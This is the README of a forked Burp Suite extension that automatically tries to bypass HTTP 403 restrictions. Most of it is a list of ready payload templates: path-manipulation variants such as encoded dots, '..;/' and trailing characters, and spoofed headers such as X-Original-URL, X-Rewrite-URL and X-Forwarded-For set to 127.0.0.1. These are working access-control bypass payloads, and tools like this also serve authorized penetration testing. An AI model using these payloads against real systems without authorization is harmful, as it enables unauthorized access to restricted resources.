# 403Bypasser
An burpsuite extension to bypass 403 restricted directory. By using PassiveScan (default enabled), each 403 request will be **automatically** scanned by this extension, so just add to burpsuite and enjoy.

### This forked repository adds new payloads.
*Original*: https://github.com/sting8k/BurpSuite_403Bypasser

**Payloads: 
$1: HOSTNAME
$2: PATH**
```
$1/$2
$1/%2e/$2
$1/$2/.
$1//$2//
$1/./$2/./
$1/$2anything -H "X-Original-URL: $2"
$1 -H "X-Original-URL: $1" 
$1/$2 -H "X-Custom-IP-Authorization: 127.0.0.1"
$1 -H "X-Rewrite-URL: $1"
$1 -H "X-Rewrite-URL: $2"
$1/$2 -H "Referer: /$2"
$1/$2 -H "X-Originating-IP: 127.0.0.1"
$1/$2 -H "X-Forwarded-For: 127.0.0.1"
$1/$2 -H "X-Forwarded-For: 127.0.0.1:80"
$1/$2 -H "X-Forwarded-For: 127.0.0.1:443"
$1/$2 -H "X-Forwarded-For: http://127.0.0.1"
$1/$2 -H "X-Remote-IP: 127.0.0.1"
$1/$2 -H "X-Client-IP: 127.0.0.1"
$1/$2 -H "X-Host: 127.0.0.1"
$1/$2 -H "X-Forwarded-Host: 127.0.0.1"
$1/$2%20/
$1/%20$2%20/
$1/$2?
$1/$2???
$1/$2//
$1/$2/
$1/$2/.random
$1/$2.json
$1/$2%23
$1/$2%26
$1.//$2
$1/$2..;/
$1/$2%
$1/$2.%2e/
```

## Installation

`BurpSuite -> Extender -> Extensions -> Add -> Extension Type: Python -> Select file: 403bypasser.py -> Next till Finish`

## Screenshot
<img src="ScreenShot.png" width="450"/>
